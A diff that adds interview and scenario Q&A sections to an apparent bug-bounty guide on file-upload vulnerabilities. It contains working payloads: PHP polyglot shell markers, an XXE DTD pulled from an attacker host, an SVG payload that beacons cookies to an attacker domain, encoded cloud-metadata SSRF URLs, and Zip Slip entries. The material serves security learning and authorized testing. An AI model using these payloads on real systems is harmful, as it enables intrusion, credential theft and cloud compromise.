@@ -1,5 +1,7 @@
 # File Upload Vulnerabilities — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)
 
+**Author:** x8bitranjit
+
 > A complete, in-depth study + field reference for file-upload attacks: from "what is it" to RCE chains across every major stack. Q&A format, progressive difficulty. Includes tools, payloads, methodology, real-world references, **and** defense + bypass.
 >
 > ⚖️ **Authorized use only.** Everything here is for bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Don't test systems you don't have written permission to test.
@@ -26,6 +28,8 @@
 - **Payload cheat sheets** (Q89–Q92)
 - **Real-world case patterns & references** (Q93–Q96)
 - **Defense — how to do uploads securely** (Q97–Q100)
+- **Level 7 — Interview questions (articulate it out loud)** (Q101–Q112)
+- **Level 8 — Scenario-based (you're handed a situation)** (Q113–Q120)
 
 ---
 
@@ -698,6 +702,131 @@ New executable files appearing in upload/web dirs (FIM), uploads with double/odd
 
 ### Q100. One-paragraph summary you can quote in a report.
 *"File-upload security is not about blocking `.php` — it's about controlling the full lifecycle. Treat filename, content-type, and bytes as hostile; validate via allowlist + magic bytes + re-encoding; store with random names outside the webroot; serve from a sandbox domain with `attachment` + `nosniff`; disable execution and config overrides in upload dirs; harden every downstream parser (XML/image/archive) against XXE, ImageTragick, and Zip Slip; and block SSRF in any URL-fetch path. A failure at any single stage — validation, storage, processing, or serving — can escalate from a benign upload to full remote code execution and cloud compromise."*
+
+---
+
+# LEVEL 7 — INTERVIEW QUESTIONS (articulate it out loud)
+
+> These test whether you can *explain* upload security, not just fire payloads — the exact thing a senior interviewer or a program's triage engineer wants to hear. Say the answer out loud; the goal is a crisp, layered explanation with the right worked example at the ready.
+
+### Q101. Explain a file-upload vulnerability to a junior in sixty seconds — what actually makes it dangerous?
+*Plain:* "Uploading a file is like handing a package to a building's mailroom. Three things decide if it's dangerous — what's *inside* it (your bytes), the *label* you wrote (filename + declared type, which you can forge), and the one that actually matters: **which room it's delivered to and who opens it.** A bomb in the mailroom bin is harmless; the same package opened in the server's control room is remote code execution."
+*Mechanism:* the attacker controls the bytes, the filename, and the `Content-Type`; the server controls **interpretation and location.** A bug exists wherever the server's interpretation/location lets your bytes *execute or get parsed dangerously.*
+*The one line that separates a finding from noise:* "The server accepted my file" is a non-event — "**the server stored my file in `/uploads/` on the app origin and executed it as PHP when I requested the URL**" is a Critical. Always end on *where it's stored, what URL serves it, and which handler opens it.*
+
+### Q102. A developer insists "we validate the `Content-Type` header, so uploads are safe." Rebut it precisely.
+*Plain:* the `Content-Type` header is a label the *client* writes — trusting it is like checking a parcel's "FRAGILE — BOOKS" sticker to decide it isn't a weapon.
+*Mechanism:* in a multipart body you set the per-part `Content-Type` to anything; it never has to match the bytes or the extension. So `filename="shell.phtml"` + `Content-Type: image/png` sails through a header check and still executes.
+*Worked rebuttal:*
+```http
+Content-Disposition: form-data; name="avatar"; filename="shell.phtml"
+Content-Type: image/png              <-- the "validation" you trust
+GIF89a;
+<?php echo php_uname(); ?>           <-- what actually runs
+```
+*Close it:* "Type must be enforced on the **bytes** (magic + real decode) *and* the **stored extension/handler**, not on an attacker-supplied header. And even perfect type validation doesn't help if the file is served executable from the web root — validation is one of four stages, and RCE only needs the *serving* stage to fail."
+
+### Q103. Allowlist vs denylist for extensions — which do you recommend, and how do you beat each as an attacker?
+*Recommendation:* **allowlist** (permit only `jpg,png,pdf`), never denylist. A denylist is a list of everything the author *remembered* to block — it leaks by omission.
+*Beating a denylist:* find one executable alias they forgot — `.phtml .pht .php5 .phar` for PHP, `.cer .asa .ashx` / `web.config` for IIS, `.jspx` for Java; plus case (`.pHp`), trailing junk (`.php.`, `.php%20`, `.php::$DATA`), and double-extension (`shell.php.jpg` on Apache `AddHandler`).
+*Beating an allowlist:* you can't invent an allowed name, so attack the **other stages** — a **magic-byte polyglot** that is a valid `.jpg` *and* runs (§8), a **config-file upload** (`.htaccess`/`.user.ini`) that makes an allowed `.jpg` execute (§10), the **FPM `image.jpg/x.php` path trick**, or pivot off execution entirely to **XXE/SSRF/processor** bugs on the parsed file. "Allowlist raises the bar to the serving and processing stages — it rarely closes them."
+
+### Q104. Why is "the server accepted my `.php`" not a vulnerability? Give the one sentence that turns it into one.
+*Plain:* acceptance is the *door opening*; the finding is *what you reached through it.* A `.php` sitting in blob storage that's served as `text/plain` (or never served at all) does nothing.
+*Mechanism:* RCE needs **four** things true at once (§12.1): survives the controls, lands in an **executed** directory, the server has the **matching handler**, and you can **request** it. Acceptance is only the first.
+*The sentence that promotes it:* "When I request `https://target/uploads/u/17/shell.phtml`, the response body contains `RCE-POC-<hash>-<hostname>` — output only server-side PHP execution can produce." Without that sentence you have an observation; with it you have a Critical.
+
+### Q105. Explain a polyglot file to a non-security engineer.
+*Plain:* it's a file that is **honestly two things at once** — a real image *and* real code — so two different programs each see what they expect.
+*Mechanism:* image formats only care about their header and structured chunks; they ignore trailing/comment bytes. A script engine (PHP) scans the whole file for `<?php`. So you put a genuine `GIF89a` header up front (the image validator is satisfied) and your code in a spot the image format ignores but PHP still reads. One file passes the "is this an image?" check *and* runs when executed.
+*Worked:* `printf 'GIF89a;\n<?php echo 7*7; ?>\n' > x.php` — `file x.php` says *GIF image data*, but a PHP handler prints `49`. "Same bytes, two truths — that's the whole trick."
+
+### Q106. Walk me up the upload severity ladder out loud — what's Critical, what's noise?
+Top to bottom: **RCE** (web shell / `.htaccess` / processor CVE / Zip Slip) = **Critical**, the top of the entire web-bug world. **XXE or SSRF** (arbitrary file read, cloud-metadata creds) = **High–Critical**. **Stored XSS served inline from the app origin** = **High** (Critical if it lands in an admin view or chains to ATO). **Overwrite another user's / a shared file** = **Medium–High** (Critical if it becomes RCE or ATO). Then **DoS in scope** and **CSV injection hitting staff** = **Medium**. At the bottom, **noise:** "it accepted a `.php`" with no execution, SVG-XSS trapped on a sandbox CDN with `attachment`+`nosniff`, self-only overwrite, "no file-type validation" with no demonstrated impact. "I climb to the highest rung the *context* allows and prove that rung with a benign marker — I never report a lower rung dressed up as a higher one."
+
+### Q107. "We re-encode every uploaded image server-side." Does that kill upload RCE? Argue both sides.
+*Their side:* re-encoding (resize/convert/strip) destroys appended payloads and trailing polyglot bytes — a plain `GIF89a;<?php` web shell won't survive, so naïve RCE is gone. True.
+*Your side (why it can be a *bigger* bug):* the re-encoder **is a server-side program parsing attacker input** — that *is* the attack surface. ImageMagick (ImageTragick CVE-2016-3714 delegate RCE; CVE-2022-44268 arbitrary file read), Ghostscript via the PDF delegate (CVE-2023-36664 `%pipe%`), exiftool (CVE-2021-22204), FFmpeg (HLS SSRF/file-read) all execute *because* processing happens. "So 'we re-encode everything' doesn't make me give up on RCE — it tells me exactly which library to fingerprint and which CVE to fire. The payload becomes a genuinely valid file of an allowed type that detonates *inside* the parser — which is why these Criticals sit un-found on 'hardened' allowlist+sandbox uploads."
+
+### Q108. Compare SVG stored-XSS on the app origin vs on a sandbox CDN — why does one pay and the other doesn't?
+*Same file, different serving context = different severity.* An SVG can carry `<script>alert(document.domain)</script>`. If it's served **`Content-Type: image/svg+xml`, inline, from `app.target.com`** (the origin that holds the session cookie and the DOM), the script runs *in that origin* → real stored XSS → steal session/CSRF token → ATO. If the *identical* file is served from `usercontent-cdn.net` with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, it downloads instead of rendering, and even if rendered it's in a throwaway origin with nothing to steal → near-zero. "The payload is identical; the *origin and headers of the serving URL* are the entire finding — which is why I inspect the fetched response headers before I ever claim XSS."
+
+### Q109. Why is an "import from URL" box often the fastest Critical in the whole upload feature?
+*Plain:* "upload from URL / fetch logo by link / import remote document" makes the **server** go fetch a URL *you* supply — that's SSRF by construction, and you haven't touched a single extension check.
+*Mechanism:* point it at the cloud metadata endpoint and the server (which *is* inside the cloud) reads it for you:
+```
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+```
+That returns **temporary IAM credentials** → list S3, read secrets, often pivot to full account/infra takeover. "It skips the entire type-validation game and lands on cloud creds — so I test the URL-fetch feature *before* I fiddle with a single polyglot."
+
+### Q110. What's the single most effective remediation — and why isn't "block `.php`" it?
+*Not "block .php":* that's a denylist (leaks via `.phtml` etc.) and only addresses the *execution* stage while ignoring parsing (XXE), serving (SVG-XSS), and URL-fetch (SSRF).
+*The highest-leverage fix:* **serve uploads from a separate, non-executing sandbox origin, with random filenames, `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`, and no server-side script handler.** That single architectural choice removes RCE (nothing executes there) *and* SVG/HTML stored-XSS (wrong origin + attachment + nosniff) at once. Layer on: allowlist + magic-byte + real re-encode; disable parser external entities and dangerous delegates; block config files; validate archive paths; SSRF-guard URL-fetch. "One design decision — *where and how it's served* — caps most of the severity; validation is defense-in-depth on top."
+
+### Q111. "Prove RCE without dropping a web shell" — how, and why would you *want* to?
+*How:* upload a file that prints a **unique marker plus a server-only fact**: `<?php echo "RCE-POC-".md5("myhandle")."-".php_uname(); ?>`. Request it; seeing `RCE-POC-<hash>-Linux host…` in the response proves the server executed your code and leaked its own hostname — a *complete* Critical. For blind cases (no visible output), make it phone home: a single benign DNS/HTTP hit to your Collaborator confirms execution out-of-band.
+*Why you want to:* a marker pays exactly the same as an interactive shell, but it keeps you inside authorization (no lateral movement, no real command execution, no persistence), it's trivially safe to include in the report, and triagers *prefer* it — they don't want a weaponized backdoor on their box. "Restraint here is what keeps the engagement legal and the bounty paid."
+
+### Q112. Rapid-fire curveballs — answer each in a sentence.
+- **"Does storing uploads on S3 make us safe?"** No — S3 stops *server* RCE only if the object isn't served executable; you can still get **stored XSS** (public object served inline with an HTML/SVG content-type from an app-trusted origin), **key/path overwrite** of a served asset (supply-chain XSS), and **presigned-PUT** abuse.
+- **"Does a WAF fix upload bugs?"** No — it filters some shell signatures, but multipart **parser-confusion** (duplicate `filename`, `filename*=`, weird boundaries), obfuscated shells (`<?=`, variable functions), and *processor/XXE/SSRF* paths sail past; a WAF is a speed bump, not the fix.
+- **"Does HTTPS matter here?"** Irrelevant — transport encryption says nothing about whether the stored file executes or is parsed dangerously.
+- **"We added `nosniff`, are SVGs safe now?"** Only partly — `nosniff` stops *MIME-sniffing* XSS, but an SVG **explicitly served `Content-Type: image/svg+xml` inline from the app origin still executes its `<script>`**; you also need `attachment`/a sandbox origin.
+- **"It's an internal admin tool, so upload RCE is low-risk?"** Often the *opposite* — admin theme/plugin/backup-restore uploads are direct RCE, and an admin-rendered SVG-XSS is Critical (privileged ATO).
+
+---
+
+# LEVEL 8 — SCENARIO-BASED (you're handed a situation → what do you do)
+
+> Each is a realistic snapshot. The skill being tested is *routing*: reading the baseline facts and picking the one path that leads to impact instead of fuzzing blindly. Every answer follows the guide's five-stage arc (baseline → classify → bypass → prove → stop).
+
+### Q113. Baseline shows: avatar returns `https://cdn.usercontent-x.net/9a..f.png`, `Content-Disposition: attachment`, `nosniff`, image re-encoded to a random name; the denylist blocks `.php`. Where do you spend your time?
+*Read the facts:* re-encoded + random name + **sandbox CDN** + attachment + nosniff = the RCE and app-origin-XSS doors are **shut** (§4.3, §23). Do **not** grind extension bypasses against this — it's hardened exactly where it matters.
+*Where the bug still lives:* the file is being **re-encoded**, i.e. *parsed server-side* — that's a live attack surface. So: **(1)** fingerprint the processor (ImageMagick? exiftool? via error strings/timing) → fire **CVE-2022-44268 file-read / ImageTragick RCE / exiftool CVE-2021-22204** with a benign OOB (§16). **(2)** Look for *other* upload surfaces on the same app — a KYC/document import, an "import from URL" (SSRF, §15), an Office/SVG import (XXE, §14) — those rarely share the avatar's hardening. **(3)** Check whether the CDN key/Content-Type is attacker-influenced (presigned PUT, §18.1). "The hardened avatar told me where *not* to dig; the processor and the sibling features are where the Critical is."
+
+### Q114. A KYC/passport upload shows a **thumbnail preview** a few seconds later. First test, and why?
+*The tell:* a preview/thumbnail means the server **parsed and rendered your file** — it opened it. That single fact routes you straight to the parser bugs before any extension play.
+*First test — XXE, because it's the highest-value and the file is likely XML under the hood* (SVG, or DOCX/XLSX = zipped XML):
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY % p SYSTEM "http://YOUR.oast.fun/x.dtd"> %p; ]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>
+```
+Host a DTD that exfils a file to your Collaborator; an OOB hit = **blind XXE → file read/SSRF** (High–Critical). *In parallel:* if the preview is a raster thumbnail, it's an **image processor** → ImageMagick/Ghostscript/exiftool CVE (§16). "Preview = parsed = test XXE and the processor first; the extension checks are a distraction on a KYC upload."
+
+### Q115. Your `.phtml` uploads fine and you can fetch it back, but the browser shows the **PHP source as text** — no execution. Debug it.
+*What the symptom means:* three of the four RCE preconditions hold (survived controls, reachable URL) but the **handler isn't mapped** for `.phtml` at that path, or it's not an executing directory. Not RCE — yet. Work the checklist:
+1. **Wrong extension for this server?** Confirm the stack (Apache mod_php vs nginx+FPM vs IIS). Try the other executable aliases: `.php5 .php7 .pht .phar` (PHP); if IIS, you're on the wrong language entirely.
+2. **nginx+FPM?** Then `.phtml` may not be routed to FPM at all — try the **path trick**: request `/uploads/u/17/me.jpg/x.php` against an uploaded `GIF89a` image (`cgi.fix_pathinfo=1`), §10.4.
+3. **Non-executing dir?** The `/uploads/` location may be static-only. Upload a **`.htaccess`** (`AddType application/x-httpd-php .jpg`) or **`.user.ini`** (`auto_prepend_file=`) to *make* it execute (§10) — if config files aren't blocked, that turns the text file into RCE.
+4. **Double-extension on Apache `AddHandler`:** try `me.phtml.jpg` / `me.php.xxx` — Apache runs any file *containing* `.php`.
+"'Served as text' is a routing gap, not a dead end — I switch the extension to one the handler owns, or I upload the config that creates a handler."
+
+### Q116. A presigned S3 `PUT` hands you a URL and lets you choose the object **key**. Walk the attack to Critical, safely.
+*Why it's dangerous:* controlling the key = controlling *where in the bucket* your bytes land. If that bucket backs the app's served assets, key control = overwrite-anything.
+*The walk:* **(1)** Intercept the presign request/response; note the key is client-supplied. **(2)** Set the key to a **served asset path** — e.g. `key=static/js/app.<hash>.js` or traverse `key=../../assets/main.js` — and PUT benign, clearly-marked content (`/* x8bit-poc */console.log('poc')`), with `Content-Type: application/javascript`. **(3)** Fetch the app; if your marked JS is now served to users, that's **stored-XSS-to-all / supply-chain compromise = Critical.** **(4)** Also test `Content-Type: text/html`/`image/svg+xml` on the object and whether it's served **inline from the app origin** → stored XSS; and `x-amz-acl: public-read` for ACL abuse.
+*Safety:* use a *unique, benign, obviously-PoC* payload (a comment + console.log), **don't clobber the real production asset** (write to a new adjacent key if possible, or restore immediately and note it), never serve real script to real users. "Prove I *can* overwrite a served asset with a harmless marker, then stop — the capability is the Critical."
+
+### Q117. The endpoint returns "file type not allowed" — but only after a ~3-second pause. What does the delay tell you, and what do you do?
+*Diagnosis:* an instant reject is a cheap header/extension check; a **multi-second reject means the server did expensive work first** — it **saved the file, then validated/AV-scanned/re-encoded, then deleted it.** Between *save* and *delete* there is a **TOCTOU race window** where your malicious file is on disk and reachable (§12.3).
+*What to do:* **(1)** Upload the marker shell (`me.phtml` with the `GIF89a`+`<?php echo …?>`), even though it'll be "rejected." **(2)** *Simultaneously* hammer parallel GETs to its likely stored URL (Burp Turbo Intruder / xargs curl) during the upload. **(3)** A **200 with the RCE marker** landing *before* the 404 (once it's deleted) = **RCE via the race.** If filenames are randomized, leak the temp path from the response/an error, or use an **LFI + phpinfo temp-file race** to include `/tmp/phpXXXXXX` before PHP deletes it. "The delay *is* the tell — save-then-validate always has a window; I just have to hit the URL inside it."
+
+### Q118. You land an SVG stored-XSS, but it only fires in **your own** profile page (self-XSS). Make it pay.
+*Why self-XSS alone is Low:* a payload that only runs in the attacker's own session harms nobody.
+*How to promote it:* find a context where **someone else** renders your uploaded SVG. **(1) Admin/staff review:** does a moderator, support agent, or KYC reviewer view uploaded avatars/documents in a panel? If your SVG executes there, it's **privileged stored XSS → admin ATO = Critical** (exfil the admin session/CSRF token). **(2) Shared/public rendering:** is the avatar shown on a public profile, in comments, in a "recent users" widget, or emailed/rendered to others? Any cross-user render turns self-XSS into stored-XSS-to-others. **(3) Overwrite a shared asset:** if you can overwrite a file served to all users (§18), the XSS reaches everyone. *Worked proof:* set the SVG to beacon its origin — `<svg onload="new Image().src='//YOUR.oast.fun/?'+document.domain+';'+document.cookie">` — and if the OOB hit arrives from an **admin/other-user** session context, you've proven cross-user execution. "Self-XSS is a payload looking for an audience — I find the view where a *victim* renders it."
+
+### Q119. Admin panel has "restore from backup (.zip)" that extracts the archive. Walk your path to RCE, safely.
+*The tell:* "extract the archive" = the server **trusts the entry names inside your zip.** That's Zip Slip by construction (§17).
+*The walk:* **(1)** Build an archive whose entry name traverses out of the extraction dir into the web root, carrying a benign marker shell:
+```
+entry name:  ../../../../var/www/html/x8-poc.phtml
+contents:    GIF89a;\n<?php echo "RCE-POC-".md5("x8bit")."-".php_uname(); ?>
+```
+(`python3 poc/make_zipslip.py --entry '../../../../var/www/html/x8-poc.phtml' --payload poc/webshell_marker.php`.) **(2)** Upload it through the restore feature. **(3)** Request `https://target/x8-poc.phtml`; the marker line = **RCE.** If `../` is stripped, try `....//`, absolute paths, or a **symlink** entry (tar preserves symlinks) to read/overwrite a trusted file. **(4)** STOP at the marker; delete the dropped file; note it. *Safety:* a unique out-of-the-way filename, benign marker only, no overwrite of real files. "Restore/import/plugin features are usually admin-only, so reaching one is a fast Critical — Zip Slip first, symlink second."
+
+### Q120. "Import from URL" blocks `169.254.169.254` and RFC-1918 ranges. How do you still prove SSRF → cloud metadata?
+*The situation:* a naïve allow/deny on the literal string/IP. SSRF filters are notoriously bypassable because the *fetch* resolves and follows differently than the filter checks.
+*The bypasses, in order of effort:* **(1) Alternate encodings of the metadata IP** — decimal `http://2852039166/`, octal `http://0251.0254.0169.0254/`, hex `http://0xA9FEA9FE/`, or `http://[::ffff:169.254.169.254]/`. **(2) DNS that resolves to it** — point your own `metadata.attacker.com` A-record at `169.254.169.254` (filter sees a hostname, resolver returns the blocked IP). **(3) DNS rebinding** — a host that passes the filter's first resolution as public, then rebinds to the metadata IP for the actual fetch (TOCTOU on resolution). **(4) Open-redirect / 302 chain** — feed a URL on an *allowed* host that 302-redirects to the metadata endpoint; many fetchers follow redirects without re-filtering. **(5) Cloud-specific hosts** — GCP `metadata.google.internal`, Azure `169.254.169.254` with `Metadata:true`, or the IMDSv2 token dance. *Confirm safely first* with your **OOB listener** (does `url=http://YOUR.oast.fun/` produce a server-side hit? that proves the fetch happens), then swap in the encoded metadata URL. "The block is on the *string*; the fetch happens on the *resolved connection* — I make those two disagree."
 
 ---
 
